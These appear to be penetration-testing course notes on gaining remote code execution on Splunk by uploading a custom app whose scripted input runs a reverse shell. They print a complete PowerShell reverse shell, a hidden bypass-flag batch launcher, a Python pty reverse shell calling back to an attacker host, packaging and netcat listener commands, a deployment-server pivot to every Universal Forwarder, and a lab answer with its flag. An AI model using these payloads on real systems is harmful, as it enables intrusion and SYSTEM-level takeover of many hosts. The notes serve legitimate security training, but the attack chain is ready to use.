# Section 14 — Attacking Splunk

## ID
905

## Module
Attacking Common Applications

## Kind
notes

## Title
Section 14 — Attacking Splunk

## Description
Covers achieving RCE on Splunk by deploying a malicious custom application containing a reverse shell (PowerShell for Windows, Python for Linux), and leveraging deployment servers to pivot to hosts running Universal Forwarders.

## Tags
splunk, rce, reverse-shell, custom-app, powershell, deployment-server

## Commands
- `git clone https://github.com/0xjpuff/reverse_shell_splunk.git`
- `tar -cvzf updater.tar.gz reverse_shell_splunk/`
- `nc -lnvp <LPORT>`

## What This Section Covers
Splunk allows administrators to install custom applications, which can include scripted inputs — scripts that Splunk executes on a defined interval. By packaging a reverse shell as a custom Splunk app and uploading it via the "Install app from file" feature, an attacker with admin access gains RCE as the Splunk service account (typically `SYSTEM` on Windows or `root` on Linux). This section walks through the full attack chain for both Windows and Linux targets, and explains how compromising a Splunk deployment server can cascade RCE to all connected Universal Forwarders.

## Methodology

### Custom Malicious App Structure

1. The Splunk app follows a specific directory layout:
```
splunk_shell/
├── bin/          # Scripts to execute (rev.py, run.ps1, run.bat)
└── default/      # inputs.conf (tells Splunk what to run and when)
```

2. The `inputs.conf` file controls execution — it specifies which script to run, enables the app, and sets the execution interval (in seconds):
```
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
The script re-executes every `interval` seconds. The input only runs if `disabled = 0` and `interval` is set.

### Windows Target Attack Chain

1. Clone the reverse shell Splunk package: `git clone https://github.com/0xjpuff/reverse_shell_splunk.git`.
2. Edit `reverse_shell_splunk/reverse_shell_splunk/bin/run.ps1` — replace the hardcoded IP and port with your listener address:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
3. The `run.bat` file is the execution wrapper — it calls the PowerShell script with bypass flags:
```bat
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```
4. Package the app: `tar -cvzf updater.tar.gz reverse_shell_splunk/`.
5. Start a listener: `nc -lnvp <LPORT>`.
6. In Splunk web UI, go to **Manage Apps → Install app from file**, browse to the tarball, and click Upload.
7. The app is auto-enabled on upload — the reverse shell connects back immediately as `NT AUTHORITY\SYSTEM`.

### Linux Target Attack Chain

1. Same structure, but edit `rev.py` instead of the PowerShell files:
```python
import sys,socket,os,pty
ip="<LHOST>"
port="<LPORT>"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
2. Package, upload, and catch the shell the same way. Python is included in every Splunk installation, so this works universally.

### Deployment Server Pivot

- If the compromised Splunk host is a **deployment server**, you can push malicious apps to every host running a Universal Forwarder.
- Place the app in `$SPLUNK_HOME/etc/deployment-apps/` on the compromised server.
- In Windows-heavy environments, use the PowerShell payload since Universal Forwarders don't ship with Python (only the full Splunk server does).

## Multi-step Workflow (optional)
```
# 1. Clone and customize the payload
git clone https://github.com/0xjpuff/reverse_shell_splunk.git
# Edit run.ps1 (Windows) or rev.py (Linux) with your IP/port

# 2. Package as tarball
tar -cvzf updater.tar.gz reverse_shell_splunk/

# 3. Start listener
nc -lnvp 9001

# 4. Upload via Splunk UI
# Manage Apps → Install app from file → Browse → Upload
# Shell connects back automatically
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Attack the Splunk target and gain RCE. Submit the contents of flag.txt in c:\loot | l00k_ma_no_AutH! | Clone `reverse_shell_splunk` repo, edit `run.ps1` with Pwnbox IP and port 9001, `tar -cvzf updater.tar.gz reverse_shell_splunk/`, start `nc -lnvp 9001`, upload tarball via Manage Apps → Install app from file, shell returns as `NT AUTHORITY\SYSTEM`, then `cat C:\loot\flag.txt` |

## Key Takeaways
- This attack uses only built-in Splunk functionality (custom app deployment + scripted inputs) — no exploit or CVE needed. If you have admin access to Splunk, you have RCE.
- The app auto-enables on upload and the scripted input fires immediately based on the `interval` setting — no manual activation or restart required.
- Splunk always ships with Python, so Python reverse shells work on both Windows and Linux Splunk servers. Universal Forwarders do NOT include Python though — use PowerShell/Batch for those.
- A compromised deployment server is a force multiplier: one malicious app upload can cascade to every Forwarder in the environment, potentially giving you `SYSTEM` shells across dozens or hundreds of hosts.
- The Splunk Free edition has no authentication at all — if a trial auto-converted, anyone on the network can deploy apps and get RCE without credentials.

## Gotchas
- The Splunk web UI uses HTTPS (`https://<TARGET>:8000`) — using HTTP will fail or redirect. Accept the self-signed certificate warning.
- Edit `run.ps1` *before* creating the tarball — if you repack after editing, make sure the directory structure is still correct (`reverse_shell_splunk/reverse_shell_splunk/bin/...` is the expected nesting from the repo clone).
- The `interval = 10` means the script re-executes every 10 seconds. You may get multiple shell callbacks — this is normal but noisy. Consider increasing the interval or killing the app after getting your initial shell.
